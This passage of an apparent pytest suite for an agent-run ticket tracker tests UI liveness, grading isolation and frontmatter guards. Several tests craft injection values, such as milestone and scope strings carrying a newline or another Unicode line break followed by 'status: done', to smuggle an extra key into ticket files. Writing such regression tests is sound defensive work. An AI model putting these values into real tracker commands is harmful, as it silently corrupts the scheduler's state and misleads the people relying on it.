             "transition", tid2, "blocked", "--as", "architect",
             "--note", "short"],
            capture_output=True, text=True)
        assert r.returncode == 0 and "WARNING" not in r.stderr


def test_ui_adopts_only_same_code_generation():
    # kspace 2026-08-18: the UI server from campaign start (Aug 12) was
    # re-adopted through three kit upgrades and never showed the
    # Waiting-on-you panel. Identity alone is not adoptable — the live
    # server must be running the code now on disk; anything else of ours
    # is a stale ghost ensure() may retire.
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import ui
    me = {"app": "agenticflow-ui",
          "repo": os.path.realpath(ui.lib.PRODUCT),
          "factory_home": os.path.realpath(ui.lib.ROOT)}
    assert not ui._current(dict(me)), "pre-generation server adopted"
    assert not ui._current({**me, "script": "deadbeefdeadbeef"}), \
        "older-code server adopted"
    assert ui._current({**me, "script": ui.SCRIPT_SHA})
    assert ui._mine({**me, "script": "deadbeefdeadbeef"}), \
        "outdated server must still read as OURS (kill-eligible)"


def test_ui_liveness_reads_entry_time_not_mtime():
    # 2026-08-02: a post-login client sync sweep touched three dead July
    # orchestrator transcripts (mtime refreshed, zero new entries) and the
    # attention UI — keying liveness off file mtime — showed a finished run
    # as active "seconds ago". Liveness now comes from the last timestamped
    # entry INSIDE the file; a touch alone must not resurrect a dead run.
    import ui
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "sess.jsonl")
        with open(p, "w") as f:
            f.write(json.dumps({"timestamp": "2026-07-29T01:00:00Z",
                                "message": {"usage": {"output_tokens": 5}}})
                    + "\n")
            f.write('{"type":"permission-mode"}\n')  # what the sweep appends
        os.utime(p, None)  # mtime says "now"; the entries say July
        assert (ui._age_s(p) or 0) <= ui.ACTIVE_WINDOW_S
        age = ui._entry_age_s(p)
        assert age is not None and age > ui.ACTIVE_WINDOW_S




# --- upstreamed from the Notes run (kit 0.3.2): frontmatter guard,
# grading isolation, pinned runners, prose delimiters, set-milestone/
# set-priority. Pin-dependent tests rewritten portable (scratch CI
# scripts) — the 0.3.1 lesson: the suite runs in every install.


def _splitlines_alphabet():
    """Every character str.splitlines() ends a line on — MEASURED, not typed.

    parse_ticket splits the frontmatter with str.splitlines(), so this is the
    real set of characters a frontmatter value may not carry. Measuring the set
    here instead of pasting ten escapes is the whole point of BUG-0058: a
    hand-written alphabet is exactly how BUG-0053's first fix came to name two
    characters while the parser honoured ten, and the eight it omitted walked
    into the file and were split back into KEYS.
    """
    return [c for c in map(chr, range(0x110000))
            if len(("a" + c + "b").splitlines()) > 1]



def test_a_milestone_value_cannot_inject_frontmatter_keys():
    # QA, DEBT-0002 attack. `milestone` is the one frontmatter field written
    # from a free-form string with no validation — deliberately, because the
    # campaign names its own milestones and a whitelist would refuse the next
    # one before its file exists. But the value is serialized straight into the
    # YAML-ish frontmatter as "milestone: %s", so a NEWLINE inside it is not a
    # value at all: it is more keys.
    #
    # MEASURED on the landed tree: `set-milestone <id> $'M3\nstatus: done'`
    # exits 0, the ticket file grows a SECOND `status:` line, lib.parse_ticket
    # resolves status='done' (last wins), and the ticket silently vanishes from
    # dispatch.py's builder queue. `ticket.py show` exits 0 and dispatch.py
    # exits 0 — nothing reports it. `ticket.py new --milestone` has the same
    # hole and had it first; set-milestone inherits it rather than introducing
    # it, so BOTH doors are pinned here.
    #
    # Not a privilege hole (the caller is already architect or human) — a
    # silent-corruption hole, in the one file the scheduler reads, reached by
    # pasting a value with a stray newline in it.
    EVIL = "M3\nstatus: done"
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")

        def front_of(tid):
            p = os.path.join(af, "tracker", "tickets", tid + ".md")
            return open(p, encoding="utf-8").read().split("---")[1]

        # door 1: `new --milestone`
        r = subprocess.run([sys.executable, tp, "new", "--type", "TASK",
                            "--title", "a", "--as", "architect", "--scope", "app",
                            "--milestone", EVIL], capture_output=True, text=True)
        if r.returncode == 0:
            f = front_of("TASK-0001")
            assert f.count("status:") == 1, (
                "`new --milestone` wrote a value containing a newline straight into "
                "the frontmatter, so the value became extra KEYS:\n" + f)

        # door 2: set-milestone
        subprocess.run([sys.executable, tp, "new", "--type", "TASK", "--title", "b",
                        "--as", "architect", "--scope", "app"],
                       capture_output=True, text=True, check=True)
        tid = sorted(n[:-3] for n in
                     os.listdir(os.path.join(af, "tracker", "tickets")))[-1]
        r = subprocess.run([sys.executable, tp, "set-milestone", tid, EVIL,
                            "--as", "architect", "--note", "paste accident"],
                           capture_output=True, text=True)
        f = front_of(tid)
        assert f.count("status:") == 1, (
            "set-milestone wrote a value containing a newline straight into the "
            "frontmatter, so the value became extra KEYS. The scheduler reads this "
            "file: lib.parse_ticket now resolves status='done' and dispatch.py drops "
            "the ticket out of the builder queue, with `ticket.py show` and "
            "dispatch.py both still exiting 0.\n" + f)
        assert lib.parse_ticket(
            os.path.join(af, "tracker", "tickets", tid + ".md")
        )["front"]["status"] == "open", "the injected status won"


# every character str.splitlines() treats as a line break. parse_ticket splits
# the frontmatter with .splitlines() (lib_ticket.py:171), so THIS is the set of
# characters that can end a frontmatter line — not just \n and \r.
_LINE_BREAKERS = [
    ("LF", "\n"), ("CR", "\r"),
    ("VT", "\x0b"), ("FF", "\x0c"),
    ("FS", "\x1c"), ("GS", "\x1d"), ("RS", "\x1e"),
    ("NEL", "\x85"), ("LS", "\u2028"), ("PS", "\u2029"),
]



def test_frontmatter_refuses_any_value_carrying_a_line_break():
    # BUG-0053, architect ruling: the defect is the SERIALIZER, not the two
    # milestone doors the pin below covers. write_ticket interpolated
    # "%s: %s" with no escaping, so ANY frontmatter value carrying a newline
    # became extra KEYS — measured through a touch_scope ELEMENT as well as
    # through milestone, which makes new --scope and amend-scope doors of the
    # same shape. One guard at serialize_value covers every present and future
    # key by construction. It must REFUSE (non-zero, nothing written) rather
    # than sanitize, and it must leave the multi-line BODY alone: descriptions,
    # criteria and History notes legitimately span lines.
    EVIL_SCOPE = "app/a.py,app\nstatus: done"
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")
        tickets_dir = os.path.join(af, "tracker", "tickets")

        def cli(*args):
            return subprocess.run([sys.executable, tp] + list(args),
                                  capture_output=True, text=True)

        # list-key door 1: `new --scope`. Refused, and no ticket is born.
        r = cli("new", "--type", "TASK", "--title", "a", "--as", "architect",
                "--scope", EVIL_SCOPE, "--milestone", "M1")
        assert r.returncode != 0, r.stdout
        assert "ERROR" in r.stderr, r.stderr        # a refusal, not a traceback
        assert os.listdir(tickets_dir) == [], os.listdir(tickets_dir)

        # the body is where multi-line text is legal, and it stays legal
        r = cli("new", "--type", "TASK", "--title", "b", "--as", "architect",
                "--scope", "app", "--description", "line one\nline two",
                "--criteria", "first\nsecond", "--check", "test -f app/main.py")
        assert r.returncode == 0, (r.stdout, r.stderr)
        tid = r.stdout.strip()
        path = os.path.join(tickets_dir, tid + ".md")
        assert cli("comment", tid, "--as", "qa",
                   "--note", "note line one\nnote line two").returncode == 0
        t = lib.parse_ticket(path)
        for legit in ("line one\nline two", "first\nsecond",
                      "note line one\nnote line two"):
            assert legit in t["body"], legit
        assert t["front"]["status"] == "open"

        # list-key door 2: amend-scope on a live ticket. The refusal leaves the
        # file byte-identical — the guard runs before write_ticket opens it.
        before = open(path, encoding="utf-8").read()
        r = cli("amend-scope", tid, "--scope", EVIL_SCOPE, "--as", "architect",
                "--note", "paste accident")
        assert r.returncode != 0, r.stdout
        assert open(path, encoding="utf-8").read() == before, \
            "a refused write must leave the ticket untouched"

        # and the ordinary rulings still land, on the real writer/parser
        assert cli("amend-scope", tid, "--scope", "app/a.py,app/b.py",
                   "--as", "architect", "--note", "widened").returncode == 0
        assert cli("set-milestone", tid, "M2", "--as", "architect",
                   "--note", "ruled").returncode == 0
        front = lib.parse_ticket(path)["front"]
        assert front["touch_scope"] == ["app/a.py", "app/b.py"], front
        assert front["milestone"] == "M2", front

        # the ticket is still where the scheduler can see it: run the real
        # dispatcher rather than restating its queue
        plan = json.loads(_run(af, "dispatch.py"))
        assert tid in plan["assign_to_builders"], plan["assign_to_builders"]



def test_frontmatter_refuses_every_character_the_parser_treats_as_a_break():
    # QA attack on the guard BUG-0053 delivered. serialize_value refuses a
    # value containing "\n" or "\r" — but parse_ticket splits the frontmatter
    # with str.splitlines(), which ends a line on EIGHT more characters. The
    # guard's alphabet and the parser's alphabet must be the same one, or
    # BUG-0053's own repro comes straight back through the characters the
    # guard does not name.
    #
    # MEASURED on 3a70e98: `set-milestone <id> $'M3\x0bstatus: done'` exits 0,
    # the file grows a SECOND `status:` line, lib.parse_ticket resolves
    # status='done', and dispatch.py drops the ticket out of
    # assign_to_builders — the exact damage BUG-0053 was filed for, with
    # set-milestone, show and dispatch all still exiting 0. Same through a
    # touch_scope element (new --scope), which resolves status='done]'.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")
        tickets = os.path.join(af, "tracker", "tickets")

        def cli(*args):
            return subprocess.run([sys.executable, tp] + list(args),
                                  capture_output=True, text=True)

        for name, ch in _LINE_BREAKERS:
            tid = cli("new", "--type", "TASK", "--title", "victim", "--as",
                      "architect", "--scope", "app").stdout.split()[-1].strip()
            path = os.path.join(tickets, tid + ".md")
            before = open(path, "rb").read()

            r = cli("set-milestone", tid, "M3" + ch + "status: done",
                    "--as", "architect", "--note", "a stray control character")

            front = open(path, encoding="utf-8").read().split("---")[1]
            assert front.count("status:") == 1, (
                "a %s (%r) in a milestone value became a second frontmatter "
                "KEY. The scheduler reads this file, so the ticket now carries "
                "an injected status:\n%s" % (name, ch, front))
            assert lib.parse_ticket(path)["front"]["status"] == "open", (
                "%s (%r): the injected status won — parse_ticket resolves %r"
                % (name, ch, lib.parse_ticket(path)["front"]["status"]))
            assert r.returncode != 0, (
                "%s (%r) was accepted (exit 0) into a line-oriented "
                "frontmatter that ends a line on it. The architect's ruling is "
                "REFUSE, not sanitize: %r" % (name, ch, r.stdout))
            assert open(path, "rb").read() == before, (
                "%s (%r): refused, but the ticket file was rewritten anyway — "
                "the refusal must happen before write_ticket opens the file"
                % (name, ch))

        # the list-key door (new --scope / amend-scope), same alphabet
        for name, ch in _LINE_BREAKERS:
            r = cli("new", "--type", "TASK", "--title", "listdoor", "--as",
                    "architect", "--scope", "app" + ch + "status: done")
            if r.returncode == 0:
                tid = r.stdout.split()[-1].strip()
                got = lib.parse_ticket(os.path.join(tickets, tid + ".md"))
                assert got["front"]["status"] == "open", (
                    "%s (%r) in a touch_scope element injected status=%r "
                    "through new --scope"
                    % (name, ch, got["front"]["status"]))
                raise AssertionError(
                    "%s (%r) in a touch_scope element was accepted by "
                    "new --scope; the serializer must refuse it" % (name, ch))



def test_frontmatter_guard_alphabet_is_derived_from_the_parser_not_typed():
    # BUG-0053 reopened / BUG-0058. The guard and the parser must share ONE
    # notion of where a frontmatter line ends. Three claims, in both
    # directions:
    #   (a) every character the parser splits on is REFUSED,
    #   (b) every character it does not split on is ACCEPTED, unchanged, and
    #       still round-trips as exactly one key,
    #   (c) the real CLI refuses each one LOUDLY — non-zero, a named ERROR,
    #       and the ticket file not rewritten,
    #   (d) the guard reads that alphabet out of the parser's own splitter
    #       rather than restating it, so the two cannot drift apart again.
    alphabet = _splitlines_alphabet()
    known = "\n\r\x0b\x0c\x1c\x1d\x1e\x85\u2028\u2029"
    assert set(known) <= set(alphabet), (
        "the measured alphabet lost a character this interpreter used to "
        "split on: %r" % ([hex(ord(c)) for c in alphabet],))

    # (a) refused — through a scalar key and through a LIST element, which is
    # the second door (new --scope / amend-scope) the architect measured.
    for ch in alphabet:
        for key, val in (("milestone", "M3" + ch + "status: done"),
                         ("touch_scope", ["app" + ch + "status: done"])):
            try:
                out = lib.serialize_value(key, val)
            except lib.FrontmatterValueError:
                continue
            raise AssertionError(
                "%r ends a frontmatter line for the PARSER but not for the "
                "guard: serialize_value(%r) returned %r, which write_ticket "
                "emits as one physical line and parse_ticket then splits into "
                "a second KEY (BUG-0053's damage, BUG-0058's alphabet)."
                % (ch, key, out))

    # (b) not over-refused: every other character in the BMP's low range is
    # still a legal frontmatter value, serialized unchanged.
    breaks = set(alphabet)
    for code in range(0x3000):
        ch = chr(code)
        if ch in breaks:
            continue
        val = "a" + ch + "b"
        assert lib.serialize_value("milestone", val) == val, (
            "%r is not a line break for the parser, so the guard must not "
            "refuse or rewrite it" % ch)
        assert lib.serialize_value("touch_scope", [val]) == "[" + val + "]"

    # ...and a legitimate value survives the REAL writer and the REAL parser,
    # including the characters that sit next to the break set.
    with tempfile.TemporaryDirectory() as td:
        path = os.path.join(td, "TASK-0001.md")
        for val in ["M3", "patch", "M3 final push", "M3\tindented",
                    "a\x09b", "a\x1bb", "a\x1fb", "a\x7fb", "a\x84b",
                    "a\x86b", "a\xa0b", "a\u2027b", "a\u202ab",
                    "M3: the one with a colon", "M3 [bracketed], and a comma"]:
            t = {"path": path,
                 "order": ["id", "status", "milestone"],
                 "front": {"id": "TASK-0001", "status": "open",
                           "milestone": val},
                 "body": "# t\n\nbody line one\nbody line two\n"}
            lib.write_ticket(t)
            got = lib.parse_ticket(path)
            assert got["front"]["milestone"] == val, (val, got["front"])
            assert got["front"]["status"] == "open", (val, got["front"])
            assert list(got["front"]) == ["id", "status", "milestone"], (
                "%r grew or lost a frontmatter key: %r" % (val, got["order"]))
            assert got["body"] == t["body"], val

    # (c) LOUD. The defect class this whole chain is about is a command that
    # exits 0 while corrupting the one file the scheduler reads, so drive the
    # REAL CLI over the MEASURED alphabet and check the exit code and the
    # message, not just the serializer's return.
    with tempfile.TemporaryDirectory() as td:
        af = _factory_repo(os.path.realpath(td))
        tp = os.path.join(af, "scripts", "ticket.py")

        def cli(*args):
            return subprocess.run([sys.executable, tp] + list(args),
                                  capture_output=True, text=True)

        tid = cli("new", "--type", "TASK", "--title", "victim", "--as",
                  "architect", "--scope", "app").stdout.split()[-1].strip()
        path = os.path.join(af, "tracker", "tickets", tid + ".md")
        before = open(path, "rb").read()
        for ch in alphabet:
            r = cli("set-milestone", tid, "M3" + ch + "status: done", "--as",
                    "architect", "--note", "a stray control character")
            assert r.returncode != 0, (
                "set-milestone exited 0 on a milestone carrying %r. The ticket "
                "file the scheduler reads is now:\n%s"
                % (ch, open(path, encoding="utf-8").read()))
            assert "ERROR" in r.stderr and "Traceback" not in r.stderr, (
                "%r must be refused out loud — a named refusal on stderr, not "
                "a traceback and not silence: %r" % (ch, r.stderr))
            assert open(path, "rb").read() == before, (
                "%r: refused, but the ticket was rewritten anyway — the guard "
                "must run before write_ticket opens the file" % ch)
        # ...and the ordinary ruling still lands through that same verb
        assert cli("set-milestone", tid, "M3", "--as", "architect",
                   "--note", "ruled").returncode == 0
        assert lib.parse_ticket(path)["front"]["milestone"] == "M3"

    # (d) DERIVED, not restated. Widen the parser's own splitter at runtime and
    # the guard must widen with it, untouched. This is the claim a typed list
    # cannot make, and the one that would have caught BUG-0058 before it
    # shipped.
    sentinel = "\u2999"          # not a line break to any Python
    assert sentinel not in breaks
    real = lib.frontmatter_lines
    try:
        lib.frontmatter_lines = lambda block: [
            piece for line in real(block) for piece in line.split(sentinel)]

        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, "TASK-0002.md")
            with open(path, "w", encoding="utf-8") as f:
                f.write("---\nid: TASK-0002\nstatus: open\n"
                        "milestone: M3" + sentinel + "status: done\n---\n# t\n")
            # the PARSER really goes through this function...
            assert lib.parse_ticket(path)["front"]["status"] == "done", (
                "parse_ticket does not split the frontmatter through "
                "lib.frontmatter_lines, so this test cannot prove anything "
                "about where the guard reads its alphabet")

        # ...so the GUARD must too, with no edit of its own.
        try:
            out = lib.serialize_value("milestone", "M3" + sentinel + "x")
        except lib.FrontmatterValueError:
            pass
        else:
            raise AssertionError(
                "the parser now ends a line on %r and the guard still accepts "
                "it (%r). The guard's alphabet is TYPED, not derived from "
                "parse_ticket's splitting, so it will drift from the parser "
                "again the way BUG-0058 did." % (sentinel, out))
    finally:
        lib.frontmatter_lines = real

    # the restore actually restored: the sentinel is legal again
    assert lib.serialize_value("milestone", "M3" + sentinel + "x") == \
        "M3" + sentinel + "x"



def test_grading_freeze_is_loud_scoped_and_keeps_receipt_bookkeeping():
    # The three properties the fix for the pin above must have, which a silent
    # no-op or a global on/off switch would each get wrong:
    #   (a) LOUD — a check that writes the graded tracker is refused AND the
    #       receipt goes RED, so the check gets rewritten rather than quietly
    #       grading nothing;
    #   (b) receipt.py's own writes to the ticket it is grading still land
    #       (last_failure_sig / the RED history line are by design);
    #   (c) SCOPED to the tracker being graded — this very test suite is run as
    #       a graded command in several tickets' Checks, and every scratch
    #       factory it builds writes tickets legitimately. A global freeze
    #       would redden the suite whenever it is the thing being graded.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        graded = _factory_repo(os.path.join(tmp, "graded"))
        other = _factory_repo(os.path.join(tmp, "other"))

        def cli(af, *args):
            return subprocess.run(
                [sys.executable, os.path.join(af, "scripts", "ticket.py")]
                + list(args), capture_output=True, text=True)

        def new_victim(af, name):
            tid = cli(af, "new", "--type", "TASK", "--title", name, "--as",
                      "architect", "--scope", "app", "--milestone", "patch"
                      ).stdout.split()[-1].strip()
            return tid, os.path.join(af, "tracker", "tickets", tid + ".md")

        near, near_path = new_victim(graded, "victim-in-graded-tracker")
        far, far_path = new_victim(other, "victim-in-another-factory")

        def writes(af, tid):
            return ("%s %s set-milestone %s M9 --as architect --note 'a check "
                    "that writes'" % (sys.executable,
                                      os.path.join(af, "scripts", "ticket.py"),
                                      tid))

        r = cli(graded, "new", "--type", "TASK", "--title", "grader", "--as",
                "qa", "--scope", "app", "--check", writes(graded, near),
                "--check", writes(other, far))
        assert r.returncode == 0, r.stdout + r.stderr
        grader = r.stdout.split()[-1].strip()

        rec = subprocess.run(
            [sys.executable, os.path.join(graded, "scripts", "receipt.py"),
             grader], capture_output=True, text=True,
            cwd=os.path.join(tmp, "graded"))
        out = rec.stdout + rec.stderr

        # (a) the graded tracker is unchanged and the receipt is RED, with the
        # refusal recorded against the offending command
        assert lib.parse_ticket(near_path)["front"]["milestone"] == "patch", out
        assert rec.returncode == 1, out
        with open(os.path.join(graded, "tracker", "receipts", grader + ".json"),
                  encoding="utf-8") as f:
            receipt = json.load(f)
        assert receipt["green"] is False, receipt
        refused = [c for c in receipt["commands"] if near in c["cmd"]]
        assert refused and refused[0]["exit"] != 0, receipt

        # (b) receipt.py still records its own RED bookkeeping on the ticket
        # it is grading — the freeze is on replayed commands, not on grading
        front = lib.parse_ticket(os.path.join(
            graded, "tracker", "tickets", grader + ".md"))["front"]
        assert front.get("last_failure_sig"), front
        assert front.get("same_failure_count") == 1, front

        # (c) a different factory's tracker is not frozen by this grading run
        assert lib.parse_ticket(far_path)["front"]["milestone"] == "M9", out



def test_grading_freeze_refuses_writes_without_refusing_reads_or_neighbours():
    # QA attack on BUG-0073's fix. The two tests above prove the freeze
    # FIRES. This one proves it does not OVER-fire: a false refusal is worse
    # than the bug it fixes, because every agent in the factory claims,
    # transitions and comments through this same write path, and half the
    # criteria in the tracker are `ticket.py show ... | grep` reads that must
    # keep working while a receipt is being computed.
    #
    # Every assertion below pairs a must-refuse with a must-not-refuse in the
    # same breath, so the test cannot pass by the guard being switched off.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")

        def cli(args, guard=False):
            env = dict(os.environ)
            if guard:
                env[lib.GRADING_ENV] = af
            else:
                env.pop(lib.GRADING_ENV, None)
            return subprocess.run([sys.executable, tp] + args, env=env,
                                  capture_output=True, text=True, cwd=tmp)

        r = cli(["new", "--type", "TASK", "--title", "victim", "--as",
                 "architect", "--scope", "app", "--milestone", "patch",
                 "--check", "true"])
        assert r.returncode == 0, r.stdout + r.stderr
        vid = r.stdout.split()[-1].strip()
        vpath = os.path.join(af, "tracker", "tickets", vid + ".md")
        tdir = os.path.join(af, "tracker", "tickets")

        # 1. READS are not refused. The guard keys on the write, not on the
        #    process: a criterion that observes the tracker is the fix's own
        #    recommended replacement for a writing one, so it must run clean
        #    under the very environment the receipt sets.
        for read in (["show", vid], ["packet", vid]):
            r = cli(read, guard=True)
            assert r.returncode == 0, (read, r.stdout + r.stderr)
            assert vid in r.stdout, (read, r.stdout)

        # 2. WRITES are refused — every verb an agent actually issues, not
        #    just the set-milestone that happened to cause BUG-0073 — and
        #    each one fails as a handled error, leaving the file byte-identical
        #    and no ticket born. A traceback would mean ticket.py crashed
        #    rather than refused, which is how a refusal turns into a
        #    half-written tracker.
        writes = [
            ["comment", vid, "--as", "qa", "--note", "n"],
            ["claim", vid, "--as", "builder-1"],
            ["transition", vid, "blocked", "--as", "architect", "--note", "n"],
            ["set-milestone", vid, "M9", "--as", "architect", "--note", "n"],
            ["set-priority", vid, "P0", "--as", "architect", "--note", "n"],
            ["amend-scope", vid, "--scope", "app/x.py", "--as", "architect",
             "--note", "n"],
            ["new", "--type", "TASK", "--title", "born-while-grading", "--as",
             "architect", "--scope", "app", "--check", "true"],
        ]
        for w in writes:
            before, born = open(vpath, "rb").read(), sorted(os.listdir(tdir))
            r = cli(w, guard=True)
            out = r.stdout + r.stderr
            assert r.returncode != 0, (w, out)
            assert "Traceback" not in out, (w, out)
            assert open(vpath, "rb").read() == before, (w, out)
            assert sorted(os.listdir(tdir)) == born, (w, out)

        # ...and the same commands, unguarded, still work — otherwise every
        # assertion above would pass just as well on a CLI broken outright.
        for w in (["comment", vid, "--as", "qa", "--note", "n"],
                  ["set-milestone", vid, "M9", "--as", "architect",
                   "--note", "n"],
                  ["new", "--type", "TASK", "--title", "born-unguarded",
                   "--as", "architect", "--scope", "app", "--check", "true"]):
            r = cli(w)
            assert r.returncode == 0, (w, r.stdout + r.stderr)
        assert lib.parse_ticket(vpath)["front"]["milestone"] == "M9"
        assert len(os.listdir(tdir)) == 2, os.listdir(tdir)

        # 3. The refusal happens BEFORE any side effect. `amend-checks`
        #    deletes the ticket's stale receipt right after writing it; if the
        #    guard fired after that instead of before, grading one ticket
        #    would silently strip another's green receipt and block its close
        #    while leaving the ticket itself untouched — invisible in a diff.
        rp = os.path.join(af, "tracker", "receipts", vid + ".json")
        amend = ["amend-checks", vid, "--check", "true", "--as", "architect",
                 "--note", "n"]
        with open(rp, "w", encoding="utf-8") as f:
            json.dump({"green": True, "commands": []}, f)
        assert cli(amend, guard=True).returncode != 0
        assert os.path.exists(rp), "a refused amend deleted the receipt anyway"
        assert cli(amend).returncode == 0        # unguarded: the amend lands
        assert not os.path.exists(rp), "amend-checks no longer clears receipts"

        # 4. The freeze is scoped by PATH CONTAINMENT, not by string prefix.
        #    Two factories side by side — /x/agenticflow and /x/agenticflow2 —
        #    share a prefix but not a tree; grading the first must not freeze
        #    the second, or a second run on the same disk deadlocks.
        assert lib._within(os.path.join(af, "tracker", "tickets", "T.md"), af)
        assert not lib._within(af + "2/tracker/tickets/T.md", af)
        assert not lib._within(os.path.dirname(af), af)   # never the parent



def test_grading_one_ticket_does_not_mutate_another_tickets_frontmatter():
    # QA attack, discovered on BUG-0053. receipt.py RE-RUNS every command it
    # harvests out of a ticket's Acceptance criteria, with shell=True, on
    # every receipt. A criterion is therefore not a measurement — it is an
    # action, replayed indefinitely. When that action writes the tracker, the
    # grading mechanism mutates the state it is grading.
    #
    # MEASURED on the live tracker, not hypothesised: BUG-0053's criterion 3
    # is the literal command
    #   python3 agenticflow/scripts/ticket.py set-milestone DEBT-0002 M2 \
    #       --as architect --note 'regression check: ...'
    # It starts with `python3`, so criteria_commands harvests it. It was a
    # no-op when written. The strategist then restamped DEBT-0002 to `patch`
    # (DEBT-0002 History, 2026-08-01T03:39:43Z). The next receipt run put it
    # back: DEBT-0002 History, 2026-08-01T07:04:21Z reads
    #   "[architect] milestone: patch -> M2: regression check: restating the
    #    current value stays a no-op"
    # — a scheduling ruling silently reverted by a grading command, attributed
    # to an architect who never ran it, and it re-fires on every re-run.
    #
    # The pin accepts EITHER fix: refuse such a criterion at the door (then
    # `ticket.py new` exits non-zero and no ticket is born), or make grading
    # unable to write the tracker. It only asserts the invariant: computing a
    # receipt for ticket A may not change ticket B's frontmatter.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tp = os.path.join(af, "scripts", "ticket.py")

        def cli(*args):
            return subprocess.run([sys.executable, tp] + list(args),
                                  capture_output=True, text=True)

        victim = cli("new", "--type", "TASK", "--title", "victim", "--as",
                     "architect", "--scope", "app", "--milestone", "patch"
                     ).stdout.split()[-1].strip()
        vpath = os.path.join(af, "tracker", "tickets", victim + ".md")
        assert lib.parse_ticket(vpath)["front"]["milestone"] == "patch"
        before = open(vpath, "rb").read()

        # a graded command that writes the tracker, exactly BUG-0053's shape
        crit = ("1. `python3 agenticflow/scripts/ticket.py set-milestone %s "
                "M9 --as architect --note 'restating the current value is a "
                "no-op'` exits 0" % victim)
        r = cli("new", "--type", "TASK", "--title", "grader", "--as", "qa",
                "--scope", "app", "--criteria", crit)
        if r.returncode != 0:
            return  # refused at the door — a legal fix; nothing to grade

        grader = r.stdout.split()[-1].strip()
        subprocess.run([sys.executable, os.path.join(af, "scripts", "receipt.py"),
                        grader], capture_output=True, text=True, cwd=tmp)

        after = open(vpath, "rb").read()
        assert after == before, (
            "computing the evidence receipt for %s rewrote %s's frontmatter. "
            "A criterion is replayed by receipt.py on every run, so a "
            "tracker-writing criterion is a mutation with no author, no "
            "ruling and no end: milestone is now %r (was 'patch'), and the "
            "History line credits an architect who never ran it."
            % (grader, victim,
               lib.parse_ticket(vpath)["front"]["milestone"]))



def test_absolute_interpreter_span_is_harvested():
    # DEBT-0004 half one: `/Library/.../python3 -m pytest x -q` was accepted by
    # NO branch of _runner_span (not a starter, not ./, not .venv/), so a
    # criterion naming this repo's pinned interpreter was silently dropped from
    # the receipt's command list — a bar that reads like a bar and grades
    # nothing (measured on DEBT-0002 criterion 4, BUG-0044 criterion 3).
    # Portable: harvesting is decided by SHAPE, never by what exists
    # here, so any absolute interpreter path serves — the kit repo's
    # own ci_command pins nothing.
    pinned = sys.executable
    span = "%s -m pytest agenticflow/scripts/test_factory.py -q" % pinned
    assert _criteria("1. `%s` exits 0." % span) == [span]
    # The quoted-prose form routes through the same predicate, so the span is
    # harvested there too — but the bare-prose scraper ALSO matches the inner
    # `pytest ...` and emits a truncated sibling. That overlap is pre-existing
    # (the two prose forms scan the same text) and is NOT fixed here: blanking
    # quoted spans before the bare scan was measured to change 10 other
    # tickets' command lists. What matters is that it fails CLOSED — the birth
    # gate refuses the pair, so the architect is told at FILING time to use
    # the backtick form or the Checks fence, rather than landing a false-RED.
    quoted = _criteria("'%s' exits 0" % span)
    assert span in quoted, quoted
    assert lib.check_defects(quoted), \
        "the quoted-prose form's truncated sibling must be refused at birth"
    # harvesting must NOT consult the filesystem: a span that disappears from
    # the command list on a machine lacking the binary is this very defect
    # (silently ungraded). Unrunnable paths are refused at birth instead.
    ghost = "/nope/nowhere/python3 -m pytest tests -q"
    assert _criteria("1. `%s` exits 0." % ghost) == [ghost]
    assert lib.check_defects([ghost]), "an unrunnable absolute program must " \
        "be refused at birth, since it is now harvested and would exit 127"
    # a leading '//' is a code comment, not a program (archived BUG-0027
    # backticks one in its criteria); harvesting it would false-RED the ticket
    assert _criteria("1. `// --- QA/BUG-0019: the other direction ---`") == []



def test_check_defects_accepts_the_ci_scripts_pinned_interpreter():
    # DEBT-0004 half two: the .venv rule exists to stop a criterion running a
    # host interpreter that has no pytest. On a repo with NO venv, where the
    # dependency lives on one pinned absolute interpreter, it fired on every
    # pytest command unconditionally — so no pytest bar in the campaign could
    # be filed at all, and DEBT-0002's test bar was graded by prose.
    # Portable form of the Notes incident: build a scratch CI script pinning
    # an interpreter and point ci_command at it — the guard must follow the
    # pin, not this suite's home repo (whose ci_command pins nothing).
    # /usr/bin/python3, not sys.executable: Homebrew paths carry '@'
    # (python@3.14), which the harvest regex's path alphabet excludes.
    PIN = "/usr/bin/python3"
    assert os.access(PIN, os.X_OK), "%s missing on this machine" % PIN
    with tempfile.TemporaryDirectory() as td:
        script = os.path.join(os.path.realpath(td), "run_tests.sh")
        with open(script, "w") as f:
            f.write("#!/bin/sh\nPYTHON=%s\n$PYTHON -m pytest tests -q\n"
                    % PIN)
        os.chmod(script, 0o755)
        orig_cfg = lib.load_run_config
        lib._PINNED_RUNNERS.clear()
        try:
            lib.load_run_config = lambda: dict(orig_cfg(), ci_command=script)
            pins = lib.pinned_runners()
            assert PIN in pins, pins
            ok = ("%s -m pytest agenticflow/scripts/test_factory.py -q"
                  % PIN)
            assert not lib.check_defects([ok]), ok
            # ...and the guard still bites exactly what it was written for
            assert lib.check_defects(["pytest tests -q"]), \
                "bare pytest still refused"
            assert lib.check_defects(["python3 -m pytest tests -q"]), \
                "an interpreter resolved off PATH is still refused"
            unpinned = "/usr/bin/false"  # executable, absolute, not pinned
            assert unpinned not in pins
            assert lib.check_defects(["%s -m pytest tests -q" % unpinned]), \
                "an absolute interpreter the CI does not pin is still refused"
        finally:
            lib.load_run_config = orig_cfg
            lib._PINNED_RUNNERS.clear()


def test_pinned_runner_hatch_does_not_excuse_pytest_it_does_not_run():
    # BUG-0057: DEBT-0004's hatch asked whether a pinned path appeared ANYWHERE
    # in the command string, not who RUNS the pytest. So every shape below was
    # waived wholesale — re-admitting the two bars the guard exists to refuse:
    # one that exits 127 (nothing installed to run it) and, worse, one that
    # exits 0 while the pytest inside it exited 127 and ran no test.
